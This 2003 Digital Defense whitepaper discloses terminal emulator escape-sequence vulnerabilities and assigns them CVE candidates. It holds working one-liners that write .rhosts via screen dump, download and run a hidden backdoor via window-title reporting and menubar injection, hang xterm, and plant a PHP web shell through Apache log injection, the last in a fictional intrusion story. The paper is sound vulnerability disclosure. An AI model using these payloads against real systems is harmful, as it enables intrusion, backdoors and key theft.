@@ -1,0 +1,385 @@
+TERMINAL EMULATOR SECURITY ISSUES
+Copyright  2003 Digital Defense Incorporated
+All Rights Reserved
+
+
+
+[ Table of Contents ]
+
+-- Summary 
+-- Disclaimer 
+-- Escape Sequences 
+-- Remote Exploitation 
+-- Screen Dumping 
+-- Window Title Reporting
+-- Miscellaneous Issues 
+-- Terminal Defense
+-- Tested Emulator Versions
+-- Vulnerability Index
+-- A Fictitious Case Study
+-- References
+-- Credits
+
+
+[ Summary ]
+
+Many of the features supported by popular terminal emulator software can be abused 
+when un-trusted data is displayed on the screen. The impact of this abuse can range from 
+annoying screen garbage to a complete system compromise. All of the issues below are 
+actually documented features, anyone who takes the time to read over the man pages or 
+source code could use them to carry out an attack. 
+
+
+
+[ Disclaimer ]
+
+There is nothing new in this paper. The entire concept of exploiting a terminal by 
+supplying hostile input has been around for over 10 years now. Unix veterans and BBS 
+users have been exposed to this type of problem since the very beginning, a newsgroup 
+search can turn up all sorts of exploits, from the ever-popular "flash" program to the 
+abuse of logging features in xterm which were disabled in R5. Therefore the purpose of 
+this paper is to identify weaknesses in the current suite of popular terminal emulation 
+software, not to rehash an ancient problem.
+
+
+
+[ Escape Sequences ]
+
+Typically, an escape sequence is a series of characters starting with the ASCII escape 
+character (0x1B) and followed by a specific set of arguments. Escape sequences were 
+originally used to control display devices such as dumb terminals and have been extended
+to allow various forms of interaction with modern operating systems. An escape sequence 
+might be used to change text attributes (color, weight), move the cursor position, 
+reconfigure the keyboard, update the window title, or manipulate the printer. Over the 
+years, many new features have been added that required enhancements to the terminal 
+emulator applications to support them. 
+
+
+
+[ Remote Exploitation ]
+
+To exploit an escape sequence feature, an attacker must be able to display arbitrary data 
+to the victim's terminal emulator. While at first glance that may seem rather unlikely, the 
+attacker can take advantage of a number of small bugs in other applications to increase 
+their chance of success.
+
+Just about every network service that uses syslog will pass remote data directly to the 
+daemon without filtering the escape character. The responsibility then lays on the syslog 
+daemon to strip the escape code before writing the log entry to the disk or terminal.  
+Although both the stock *BSD syslog daemons as well the sysklogd package filter escape 
+sequences, msyslog, syslog-ng, and the logging daemons supplied with many commercial 
+UNIX-based operating systems do not.
+
+While sending data directly to a vulnerable syslogd or rwalld service is the most direct 
+form of attack, there are literally dozens of other ways to place hostile binary data onto
+the terminal of a remote user. The Apache web server makes an effort to clean garbage  
+from its access logs, but it still allows escape characters to be injected into the error logs.
+Many command-line network tools can be exploited by a hostile service response, some 
+examples of this is include wget, curl, ftp, and telnet. 
+
+Multi-user systems are especially vulnerable, as any user can send a system-wide 
+message under the default configuration of most operating systems. Placing the attack 
+data into the banner of a popular FTP server, telnet service, or message of the day file 
+will increase the chance of finding a valid target. Certain console email clients refuse to 
+display files when the content-type of an attachment is set to a unrecognized value, so the 
+user must save the file and then read it on the command line, often just using the standard 
+"cat" utility. 
+
+
+
+[ Screen Dumping ]
+ 
+Eterm and rxvt both implement what they call the "screen dump" feature. This escape  
+sequence will cause an arbitrary file to be opened and filled with the current contents of 
+the terminal window. These are the only two tested emulators[1] that still had the ability 
+to write to files enabled by default. Although rxvt will ignore dump requests for existing 
+files, Eterm[2] will happily delete the file and then create it again. Although it is 
+technically the same feature, the OSC code used to trigger it is different between the two 
+emulators. For rxvt, the screen dump code is 55, for Eterm, it is 30.  It is possible to 
+control the entire contents of the file by specifying the reset sequence, then the required 
+data, followed by the screen dump command. 
+
+$ echo -e "\ec+ +\n\e]<Code>;/home/user/.rhosts\a"
+
+The same approach can be used to create an authorized_keys file for SSH, a replacement 
+passwd file, or even a hostile PHP script written to the user's web directory. This attack 
+requires no interaction on the part of the user and would be very difficult to detect if done 
+correctly. The primary difference between this issue and some of the others mentioned in 
+this paper is that the actual "exploitation" happens on the system running the emulator 
+software, not the current system that the terminal is accessing. The code that is  
+responsible for opening the dump file is shown below. 
+
+/* rxvt */ 
+if ((fd = open(str, O_RDWR | O_CREAT | O_EXCL, 0600)) >= 0) 
+
+/* Eterm */ 
+unlink(fname);
+outfd = open(fname, O_CREAT | O_EXCL | O_NDELAY | O_WRONLY, S_IRUSR | S_IWUSR);
+
+[1] XFree86's xterm disabled an equivalent feature in X11R5 due to security concerns. It 
+    can still be enabled with a compile-time option.
+
+[2] Eterm actually disabled this in 0.9.2 (October 31, 2002), however many recent Linux 
+    distributions still shipped with 0.9.1.
+
+
+
+[ Window Title Reporting ]
+
+One of the features which most terminal emulators support is the ability for the shell to 
+set the title of the window using an escape sequence. This feature was originally 
+implemented by DEC for DECterm and has since been added to most emulators in use 
+today. The easy way to set the window title of a terminal is using the echo command:
+
+$ echo -e "\e]2;This is the new window title\a"
+
+When the output of the above command is displayed on the terminal, it will set the 
+window title to that string. Setting the window title by itself is not much of a security 
+issue, however certain xterm variants (and dtterm) also provide an escape sequence for 
+reporting the current window title. This essentially takes the current title and places it 
+directly on the command line. Due to the way that most emulators processes the escape 
+sequence, it is not possible to embed a carriage return into the window title itself, so the 
+user would need to hit enter for it to process the title as a command. The escape sequence 
+for reporting the window title is:
+
+$ echo -e "\e[21t"
+
+At this point, the attacker needs to convince the user to hit enter for the "exploit" to 
+succeed. There are a number of techniques available to both hide the command and 
+encourage the user to "press enter to continue". The simplest is to just insert a prompt 
+followed by the "invisible" character attribute right before reporting the title. Another 
+method is to set the foreground and background colors to be the same (all black or white) 
+and hope the user hits the enter key when trying to determine what happened.  The 
+following example for xterm demonstrates a sequence that downloads and executes a 
+backdoor while hiding the command line. The "Press Enter >" string should be changed 
+to something appropriate for the attack vector. Some likely candidates include  "wget 
+internal error: press enter to continue" or "Error: unknown TERM, hit enter to continue".
+
+$ echo -e "\e]2;;wget 127.0.0.1/.bd;sh .bd;exit;\a\e[21t\e]2;xterm\aPress Enter>\e[8m;"
+
+Any terminal emulator that allows the window title to be placed on the command-line is 
+vulnerable to this attack. The applications which were confirmed vulnerable include 
+xterm, dtterm, uxterm, rxvt, aterm, Eterm, hanterm, and putty[1]. The tested applications 
+that did not allow the title to be written include gnome-terminal 2.0, konsole, SecureCRT,
+and aterm.
+
+[1] Although putty would place the title onto the command-line, we were not able to find 
+a method of hiding the command, since neither the "invisible" character attribute nor the 
+foreground color could be set. Putty has a relatively low limit to the number of characters 
+that can be placed into the window title, so it is not possible to simply flood the screen 
+with garbage and hope the command rolls past the current view.
+
+
+
+[ Miscellaneous Issues ]
+
+Eterm should be given an award for the "Easiest to Compromise" terminal emulator. The 
+developers based much of their code off of the rxvt and xterm source, so Eterm tends to 
+share the same problems as those two emulators as well. If you happen to be running a  
+CVS version of Eterm from between February 10th and May 8th of 2001, it was possible 
+to execute an arbitrary command just by displaying the following escape sequence: 
+
+$ echo -e "\e]6;73;command\a"
+ 
+Fortunately, this feature never made it into an official release, the "fork-and-exec" ability 
+was replaced by the script action spawn() instead. 
+
+During the research process, a number of small bugs were found that would either lock 
+up the emulator completely or crash it. Although they can be disregarded as simple denial 
+of service attacks, they could be abused to prevent an administrator from seeing  
+subsequent logs during a compromise. In general, the code which processed application-
+side input seemed to place little emphasis on sanitizing the data before passing it directly 
+to system-level functions. While there was some effort made to avoid standard buffer  
+overflows, much of the loop-based character processing appeared ripe for a denial of 
+service attack. An example of this is a bug in the DEC UDK processing of XFree86's 
+xterm application, the following command will place the process into a tight resource-
+eating loop:
+
+$ echo -e "\eP0;0|0A/17\x9c"
+
+This bug was reported to xfree86@xfree86.org on December 17th, 2002 and no response 
+was received as of the publication of this writing. The hanterm application is also 
+vulnerable to this issue, as the code base started off as a direct copy of xterm.
+
+Both rxvt and aterm support a feature known as the menuBar. This feature allows the user 
+to create drop-down menus at the top of the terminal screen using both menu 
+configuration files and escape sequences. Anyone able to display data on the terminal  
+could modify the menu entries in a way that would compromise the system when 
+accessed. This type of attack relies more on social engineering, but still provides a 
+potential entry point when nothing else is available. The example below will create a new 
+top-level menu item called "Special" with a single item labeled "Access", when clicked it 
+will download and execute a backdoor from http://127.0.0.1/.bd and exit the shell.
+
+$  echo -e "\e]10;[:/Special/{Access} wget 127.0.0.1/.bd\rsh bd\rexit\r:]\a\e]10;[show]\a"
+
+
+
+[ Terminal Defense ]
+
+The ideal solution is to sanitize all data before displaying it on your terminal, however 
+without a custom terminal application or data filter, you can't guarantee that every tool 
+you use on the command-line is going to strip escape sequences. The responsibility 
+should rest on the actual terminal emulator; any features that allow file or command-line 
+access should be disabled by default and more attention should be paid to new features 
+that implement any use of escape sequences.
+
+The tested terminal emulators that were not susceptible to the screen dump or window 
+title attacks include KDE's konsole, Gnome's gnome-terminal, Vandyke's SecureCRT, 
+and Sasha Vasko's aterm. Konsole and gnome-terminal each use their own independent 
+code-base and didn't try to support the same massive feature set as the others.  
+SecureCRT took a similar approach, emulating just the minimum needed to be usable. 
+With aterm, the code was originally based on rxvt, however many of the dangerous 
+features were removed as the project progressed.
+
+
+
+[ Test Emulator Versions ]
+
+xterm:          xf86 4.2.0  (patch 165)
+aterm:          0.42
+rxvt:           2.7.8
+Eterm:          0.9.1
+konsole:        3.1.0 rc5
+putty:          0.53
+SecureCRT:      3.4.6
+gnome-terminal:	2.0.2 (libzvt 2.0.1) [2.2 indirectly]
+hanterm-xf:     2.0
+
+
+
+[ Vulnerability Index ]
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned CVE 
+candidate namess for all issues described in this paper. 
+
+CAN-2003-0020 Apache Error Log Escape Sequence Injection
+
+CAN-2003-0021 Screen Dump: Eterm 
+CAN-2003-0022 Screen Dump: rxvt
+
+CAN-2003-0063 Window Title Reporting: xterm 
+CAN-2003-0064 Window Title Reporting: dtterm
+CAN-2003-0065 Window Title Reporting: uxterm
+CAN-2003-0066 Window Title Reporting: rxvt
+CAN-2003-0067 Window Title Reporting: aterm
+CAN-2003-0068 Window Title Reporting: eterm
+CAN-2003-0069 Window Title Reporting: putty
+CAN-2003-0070 Window Title Reporting: gnome-terminal
+CAN-2003-0078 Window Title Reporting: hanterm-xf
+
+CAN-2003-0071 DEC UDK Processing DoS: xterm
+CAN-2003-0079 DEC UDK Processing DoS: hanterm-xf
+
+CAN-2003-0023 Menubar Manipulation: rxvt
+CAN-2003-0024 Menubar Manipulation: aterm
+
+
+
+[ A Fictitious Case Study ]
+
+Jim is the sole administrator for the web server farm at a moderately sized ISP. Most of 
+his company's clients maintain their own sites and Jim's primary responsibility is to keep 
+the web servers online and secured.  Jim spends some of his spare time dabbling with  
+PHP and uses his workstation as his development system. The workstation is on the same 
+network segment as the rest of the servers and the firewall only allows TCP port 80 and 
+443 inbound. Jim has a new 2.5Ghz P4 and finally has enough processing power to run 
+the Enlightenment window manager with all the tweaks. His favorite part about 
+Enlightenment is the terminal emulator, Eterm, which lets him make the background 
+transparent and do all sorts of imaging tricks. Jim keeps a tail process running for the 
+error_log files on each server he manages, allowing him to easily spot script bugs and 
+misconfigurations before the customer calls him to fix it. 
+
+Andre is pissed. Some "friends" from his old hacking group have posted some 
+embarrassing photos of him on the group's home page. The page is hosted in the ~user 
+directory on a web server at some dinky ISP his old friend uses. He starts poking at the 
+web server only to give up about 30 minutes later after failing to find a single vulnerable 
+CGI or outdated service.  He starts up Nmap again, this time on the whole class C that the 
+web server resides in, determined to take down the entire subnet if he has to. He finds 
+another web server, this one is running a traceroute gateway that is vulnerable to meta-
+character injection. Andre manages to get an outbound shell back to a bounce system and 
+proceeds to poke around. He finds what appears to be an OpenSSH public key in the /tmp 
+directory, named JimH.pub. Looking at the key file, he sees that the userid stored in it is 
+for jim@jimsbox.weeisp.com. A quick check shows that jimsbox.weeisp.com not only 
+resolves to an external address, but is also running a web server. 
+
+The index page of Jim's web server consists of a couple pictures of him, some links to his 
+favorite news sites, some screenshots of his new super-leet desktop, and some of his 
+latest PHP projects. The first PHP project link Andre clicks on immediately starts 
+spewing errors, complaining about not being able to connect to the database. The error 
+message itself is interesting though, since it contains the full path to the script that 
+triggered the error. Andre makes a quick note of this and keeps digging around, hoping 
+for an easy entry point. As soon as he pulls up the desktop screen shots, he knows he 
+struck gold. The screen shot not only shows a scantily clad Italian model in the 
+background, but an Eterm open tailing the logs of the same server his pictures are being 
+served from. He gets to work, hitting the workstation with every tool he can find, but an 
+hour later he still hasn't busted a shell. While looking through the screen shots again, 
+Andre gets the idea to look at the Eterm documentation and see what other features it 
+supports. Not only is the documentation easy to read with plenty of examples, but it 
+mentions an interesting feature described as a "screen dump".
+
+About two hours later, Andre finally manages to get Eterm and its 60 megabytes of  
+support libraries compiled. He discovers that to force Eterm to write out a file, all he has 
+to do is display a certain sequence of characters to the screen. The question now is how to 
+get those characters onto that Eterm at 4:30 in the morning. After a quick review of the 
+Apache source code, he finally finds a spot in the error handling code where he can inject 
+arbitrary data into the log files. All he has to do is send a request for a file with the escape
+sequence he wants to use and Apache will write the unfiltered data directly to the log file. 
+
+Now that he can write arbitrary files to the workstation, he has to find a method of using 
+it to gain access. Andre is pretty sure that the workstation is running SSH, but the only 
+ports available are 80 and 443. He remembers that the PHP errors he saw earlier provided 
+the full path to the web root, if he can write files there, then he run commands through the 
+web server. Five minutes later, Andre is connecting to the target web server and sending 
+a GET request for a string generated with the following command:
+
+$ echo -e "\ec<?passthru($c);?>\e]30;/home/www/htdocs/owned.php\a"
+
+This command clears the current screen buffer, displays his hostile PHP code to the 
+screen, and then uses the screen dump command to write it into the web root. He points 
+his browser to http://jimsbox.weeisp.com/owned.php?c=id and starts the process of  
+rooting Jim's workstation, stealing his SSH keys, and taking those horrid pictures (as well 
+as the rest of the group's files) off of that web server.
+
+
+
+[ References ]
+
+This Paper and Associated Tools
+--- http://www.digitaldefense.net/labs/whitepapers.html
+--- http://www.digitaldefense.net/labs/securitytools.html
+
+Recognized Escape Sequences
+--- Eterm:  http://www.eterm.org/docs/view.php?doc=ref
+--- xterm:  http://rtfm.etla.org/xterm/ctlseq.html
+--- dtterm: http://hpc.uky.edu/cgi-bin/man.cgi?section=all&topic=dtterm
+--- rxvt:   http://www.rxvt.org/refer/rxvtRef.html
+
+Solar Designer's Post on Syslog Filtering
+--- http://marc.theaimsgroup.com/?l=bugtraq&m=96938656931350
+
+ADM's "The Evil Escape Sequences"
+--- http://www.attrition.org/security/advisory/ADM/adm.evil.esc.advisory
+
+AmigaOS Escape Sequence Exploits
+--- http://www.abraxis.co.uk/SA-2001-11-08.html
+
+MS-DOS/Windows Key Redefinition
+--- http://lists.insecure.org/lists/bugtraq/1994/Jul/0029.html
+
+Multiple Emulator Window Resize DoS
+--- http://archives.neohapsis.com/archives/bugtraq/2000-05/0409.html
+--- http://groups.google.com/groups?selm=E12zFeu-00075I-00%40ixion
+
+The Original "Flash"
+--- http://www.parallaxresearch.com/files/unix/exploits/flash.c
+--- http://groups.google.com/groups?selm=342k7c%243ne%40news.ysu.edu
+--- http://www.phrack-dont-give-a-shit-about-dmca.org/show.php?p=47&a=4
+
+
+
+[ Credits ]
+
+This paper was written by H D Moore, with much help from the rest of the Digital 
+Defense Operations Team. I would like to thank Solar Designer for providing some great 
+feedback on the original draft and Mark Cox for handling the CVE candidate generation 
+and vendor coordination.
